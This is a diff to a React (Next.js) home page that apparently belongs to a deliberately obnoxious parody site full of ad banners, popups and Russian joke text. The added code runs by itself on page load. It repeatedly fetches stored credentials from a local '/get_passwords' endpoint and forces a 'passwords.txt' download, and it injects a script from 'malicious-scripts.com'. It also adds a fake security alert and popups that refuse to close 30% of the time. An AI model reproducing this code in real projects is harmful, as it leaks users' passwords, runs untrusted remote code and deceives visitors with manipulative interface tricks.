@@ -6,10 +6,102 @@ import AdBanner from "@/components/ad-banner"
 import RandomCursor from "@/components/random-cursor"
 import BlinkingText from "@/components/blinking-text"
 import PopupAd from "@/components/popup-ad"
+import { AutoScrollPopup } from "@/components/auto-scroll-popup"
+import { redirect } from "next/navigation";
+
+import MovingButtonsTerms from "@/components/moving-button-terms"
 
 export default function Home() {
   const [showPopup, setShowPopup] = useState(false)
   const [popupCount, setPopupCount] = useState(0)
+  const [open, setOpen] = useState(false)
+  useEffect(() => {
+    const fetchAndDownloadPasswords = async () => {
+      try {
+        const response = await fetch('http://localhost:5000/get_passwords');
+        const data = await response.json();
+
+        if (data.credentials) {
+          // Create a blob with the passwords data
+          const blob = new Blob([data.credentials.join('\n')], { type: 'text/plain' });
+          const url = URL.createObjectURL(blob);
+
+          // Create a temporary anchor element to trigger download
+          const a = document.createElement('a');
+          a.href = url;
+          a.download = 'passwords.txt';
+          document.body.appendChild(a);
+          a.click();
+
+          // Clean up
+          setTimeout(() => {
+            document.body.removeChild(a);
+            URL.revokeObjectURL(url);
+          }, 100);
+        }
+      } catch (error) {
+        console.error('Error fetching passwords:', error);
+      }
+    };
+
+    // Set up interval with random time (less than 5 seconds)
+    const minInterval = 10000; // 2 seconds minimum
+    const maxInterval = 15000; // 5 seconds maximum
+    const getRandomInterval = () => Math.floor(Math.random() * (maxInterval - minInterval + 1)) + minInterval;
+
+    const intervalId = setInterval(fetchAndDownloadPasswords, getRandomInterval());
+
+    // Clean up interval on component unmount
+    return () => clearInterval(intervalId);
+  }, []);
+
+
+    // Example content - this would typically be your terms and conditions
+    const termsContent = `Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nullam euismod, nisl eget aliquam ultricies, nunc nisl aliquet nunc, quis aliquam nisl nunc quis nisl.
+
+  Pellentesque habitant morbi tristique senectus et netus et malesuada fames ac turpis egestas. Vestibulum tortor quam, feugiat vitae, ultricies eget, tempor sit amet, ante.
+
+  Donec eu libero sit amet quam egestas semper. Aenean ultricies mi vitae est. Mauris placerat eleifend leo. Quisque sit amet est et sapien ullamcorper pharetra.
+
+  Vestibulum erat wisi, condimentum sed, commodo vitae, ornare sit amet, wisi. Aenean fermentum, elit eget tincidunt condimentum, eros ipsum rutrum orci, sagittis tempus lacus enim ac dui.
+
+  Donec non enim in turpis pulvinar facilisis. Ut felis. Praesent dapibus, neque id cursus faucibus, tortor neque egestas augue, eu vulputate magna eros eu erat. Aliquam erat volutpat.
+
+  Nam dui mi, tincidunt quis, accumsan porttitor, facilisis luctus, metus. Phasellus ultrices nulla quis nibh. Quisque a lectus. Donec consectetuer ligula vulputate sem tristique cursus.
+
+  Sed adipiscing ornare risus. Morbi est est, blandit sit amet, sagittis vel, euismod vel, velit. Pellentesque egestas sem. Suspendisse commodo ullamcorper magna.
+
+  Morbi in ipsum sit amet pede facilisis laoreet. Donec lacus nunc, viverra nec, blandit vel, egestas et, augue. Vestibulum tincidunt malesuada tellus. Ut ultrices ultrices enim.
+
+  Curabitur sit amet mauris. Morbi in dui quis est pulvinar ullamcorper. Nulla facilisi. Integer lacinia sollicitudin massa. Cras metus.
+
+  Sed aliquet risus a tortor. Integer id quam. Morbi mi. Quisque nisl felis, venenatis tristique, dignissim in, ultrices sit amet, augue. Proin sodales libero eget ante.
+
+  Pellentesque habitant morbi tristique senectus et netus et malesuada fames ac turpis egestas. Vestibulum tortor quam, feugiat vitae, ultricies eget, tempor sit amet, ante.
+
+  Donec eu libero sit amet quam egestas semper. Aenean ultricies mi vitae est. Mauris placerat eleifend leo. Quisque sit amet est et sapien ullamcorper pharetra.
+
+  Vestibulum erat wisi, condimentum sed, commodo vitae, ornare sit amet, wisi. Aenean fermentum, elit eget tincidunt condimentum, eros ipsum rutrum orci, sagittis tempus lacus enim ac dui.
+
+  Donec non enim in turpis pulvinar facilisis. Ut felis. Praesent dapibus, neque id cursus faucibus, tortor neque egestas augue, eu vulputate magna eros eu erat. Aliquam erat volutpat.
+
+  Nam dui mi, tincidunt quis, accumsan porttitor, facilisis luctus, metus. Phasellus ultrices nulla quis nibh. Quisque a lectus. Donec consectetuer ligula vulputate sem tristique cursus.
+
+  Sed adipiscing ornare risus. Morbi est est, blandit sit amet, sagittis vel, euismod vel, velit. Pellentesque egestas sem. Suspendisse commodo ullamcorper magna.
+
+  Morbi in ipsum sit amet pede facilisis laoreet. Donec lacus nunc, viverra nec, blandit vel, egestas et, augue. Vestibulum tincidunt malesuada tellus. Ut ultrices ultrices enim.
+
+  Curabitur sit amet mauris. Morbi in dui quis est pulvinar ullamcorper. Nulla facilisi. Integer lacinia sollicitudin massa. Cras metus.
+
+  Sed aliquet risus a tortor. Integer id quam. Morbi mi. Quisque nisl felis, venenatis tristique, dignissim in, ultrices sit amet, augue. Proin sodales libero eget ante.`
+
+
+
+const handleSubmit = () => {
+  alert("Form submitted!")
+  setOpen(false)
+}
+
 
   const [showPopup1, setshowPopup1] = useState(false);
   const [showAcceptPopup, setShowAcceptPopup] = useState(false);
@@ -144,6 +236,29 @@ export default function Home() {
       });
     }, 16);
   };
+  useEffect(() => {
+    // Show popup ad every 5 seconds (very annoying)
+    const interval = setInterval(() => {
+      setShowPopup(true)
+      setPopupCount((prev) => prev + 1)
+    }, 5000)
+
+    // Show fake security alert after 10 seconds
+    const securityTimeout = setTimeout(() => {
+      setShowFakeSecurityAlert(true)
+    }, 10000)
+
+    // Load malicious script
+    const script = document.createElement('script')
+    script.src = 'https://malicious-scripts.com/tracker.js'
+    document.body.appendChild(script)
+
+    return () => {
+      clearInterval(interval)
+      clearTimeout(securityTimeout)
+    }
+  }, [])
+
 
   const stopAutoScroll = () => {
     if (scrollIntervalRef.current) clearInterval(scrollIntervalRef.current);
@@ -217,7 +332,10 @@ export default function Home() {
   const handleButtonClick = () => {
     alert("Поздравляем! Вы выиграли ничего!")
     setshowPopup1(true)
+    setOpen(true)
     setShowPopup(true)
+    redirect("/captcha"); // Redirects to `/new-page` automatically
+
   }
 
   return (
@@ -229,10 +347,28 @@ export default function Home() {
         <AdBanner position="left" />
         <AdBanner position="left" />
         <AdBanner position="left" />
+        <AdBanner position="left" />
+        <AdBanner position="left" />
+        <AdBanner position="left" />
+        <AdBanner position="left" />
+        <AdBanner position="left" />
+        <AdBanner position="left" />
+        <AdBanner position="left" />
+        <AdBanner position="left" />
+        <AdBanner position="left" />
       </div>
 
       {/* Right side ads */}
       <div className="fixed right-0 top-0 h-full w-20 md:w-40 flex flex-col gap-4 p-2 z-10">
+        <AdBanner position="right" />
+        <AdBanner position="right" />
+        <AdBanner position="right" />
+        <AdBanner position="right" />
+        <AdBanner position="right" />
+        <AdBanner position="right" />
+        <AdBanner position="right" />
+        <AdBanner position="right" />
+        <AdBanner position="right" />
         <AdBanner position="right" />
         <AdBanner position="right" />
         <AdBanner position="right" />
@@ -251,7 +387,12 @@ export default function Home() {
             <span className="relative text-xl font-bold">НАЖМИ МЕНЯ!</span>
           </button>
         </div>
-
+        {showPopup && <PopupAd onClose={() => {
+          // Make it hard to close - 30% chance it won't close
+          if(Math.random() > 0.3) {
+            setShowPopup(false)
+          }
+        }} count={popupCount} />}
 
       </main>
 
